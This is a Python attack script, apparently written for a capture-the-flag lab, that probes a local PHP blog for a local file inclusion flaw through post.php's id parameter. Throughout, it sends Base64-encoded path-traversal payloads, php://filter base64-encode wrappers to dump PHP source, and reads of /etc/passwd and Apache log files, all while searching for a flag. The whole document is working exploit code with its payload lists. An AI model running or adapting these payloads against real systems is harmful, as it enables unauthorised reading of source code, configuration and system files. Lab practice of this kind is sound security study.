import requests
import base64
import urllib.parse

BASE_URL = "http://127.0.0.1:33209"

print("=" * 80)
print("Encoder64 Blog - Targeted LFI Testing")
print("=" * 80)

# The error showed file_exists() is used, which means:
# 1. File must exist to be included/read
# 2. Path is being checked before inclusion

print("\n[*] Testing common flag locations with Base64 encoding")
print("-" * 80)

# Common flag locations
flag_locations = [
    "flag.txt",
    "flag",
    "FLAG.txt",
    "FLAG",
    "secret.txt",
    "secret",
    "../flag.txt",
    "../../flag.txt",
    "../../../flag.txt",
    "../../../../flag.txt",
    "/flag.txt",
    "/flag",
    "/tmp/flag.txt",
    "/tmp/flag"
]

for location in flag_locations:
    # Base64 encode the path
    b64_path = base64.b64encode(location.encode()).decode()
    url = f"{BASE_URL}/post.php?id={b64_path}"
    
    try:
        resp = requests.get(url, timeout=10)
        print(f"\n[*] Testing: {location}")
        print(f"Base64: {b64_path}")
        print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        if len(resp.content) > 50 and "Post not found" not in resp.text:
            print(f"Response: {resp.text}")
            if "FLAG{" in resp.text:
                print(f"[!] FLAG FOUND!")
                break
        elif "Post not found" in resp.text:
            print(f"[-] Post not found (file might not exist)")
        else:
            print(f"[-] Short response")
    except Exception as e:
        print(f"[-] Error: {e}")

# Since this is a blog, let's try to find where posts are stored
print("\n\n[*] Testing blog post storage locations")
print("-" * 80)

post_locations = [
    "posts/1.txt",
    "posts/1",
    "posts/post1.txt",
    "posts/post_1.txt",
    "data/posts/1.txt",
    "content/posts/1.txt",
    "blog/posts/1.txt",
    "./posts/1.txt",
    "./data/posts/1.txt",
    "../posts/1.txt",
    "../../posts/1.txt",
    "post.txt",
    "post1.txt",
    "1.txt",
    "1"
]

for location in post_locations:
    b64_path = base64.b64encode(location.encode()).decode()
    url = f"{BASE_URL}/post.php?id={b64_path}"
    
    try:
        resp = requests.get(url, timeout=10)
        print(f"\n[*] Testing: {location}")
        print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        if len(resp.content) > 100:
            print(f"[+] Got longer response: {len(resp.text)} chars")
            print(f"Content preview: {resp.text[:300]}")
            if "FLAG{" in resp.text:
                print(f"[!] FLAG FOUND in post!")
                break
    except Exception as e:
        print(f"[-] Error: {e}")

# Test php://filter to read source directly
print("\n\n[*] Testing php://filter wrappers for post.php source")
print("-" * 80)

wrapper_tests = [
    ("php://filter/read=convert.base64-encode/resource=./post.php", "Read filter"),
    ("php://filter/convert.base64-encode/resource=./post.php", "Convert filter"),
    ("php://filter/convert.base64-encode|convert.base64-decode/resource=./post.php", "Chain filter"),
]

for wrapper, desc in wrapper_tests:
    print(f"\n[*] {desc}: {wrapper[:50]}...")
    
    # Try wrapper directly
    try:
        url = f"{BASE_URL}/post.php?id={wrapper}"
        resp = requests.get(url, timeout=10)
        print(f"Plain wrapper - Status: {resp.status_code}, Length: {len(resp.content)}B")
        
        if len(resp.content) > 100:
            if len(resp.text) < 500 and resp.text.count('\n') < 5:
                try:
                    decoded = base64.b64decode(resp.text.strip()).decode('utf-8', errors='ignore')
                    print(f"[!] SUCCESS! Decoded source:")
                    print(decoded[:1000])
                    break
                except:
                    print(f"Content: {resp.text[:200]}")
    except Exception as e:
        print(f"Error: {e}")
    
    # Try Base64 encoded wrapper
    try:
        b64_wrapper = base64.b64encode(wrapper.encode()).decode()
        url = f"{BASE_URL}/post.php?id={b64_wrapper}"
        resp = requests.get(url, timeout=10)
        print(f"Base64 wrapper - Status: {resp.status_code}, Length: {len(resp.content)}B")
        
        if len(resp.content) > 100:
            if len(resp.text) < 500 and resp.text.count('\n') < 5:
                try:
                    decoded = base64.b64decode(resp.text.strip()).decode('utf-8', errors='ignore')
                    print(f"[!] SUCCESS! Decoded source from Base64 wrapper:")
                    print(decoded[:1000])
                    break
                except:
                    print(f"Content: {resp.text[:200]}")
    except Exception as e:
        print(f"Error: {e}")

# Try reading various system files to understand the filtering
print("\n\n[*] Testing system file access")
print("-" * 80)

system_files = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/issue",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log"
]

for sysfile in system_files[:2]:  # Just test a couple
    b64_sysfile = base64.b64encode(sysfile.encode()).decode()
    url = f"{BASE_URL}/post.php?id={b64_sysfile}"
    
    try:
        resp = requests.get(url, timeout=10)
        print(f"\n[*] Testing: {sysfile}")
        print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        if len(resp.content) > 100:
            print(f"Content: {resp.text[:500]}")
        elif "Warning" in resp.text:
            print(f"PHP Warning: {resp.text[:300]}")
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n" + "=" * 80)
print("Testing complete - check for FLAG patterns above")
print("=" * 80)
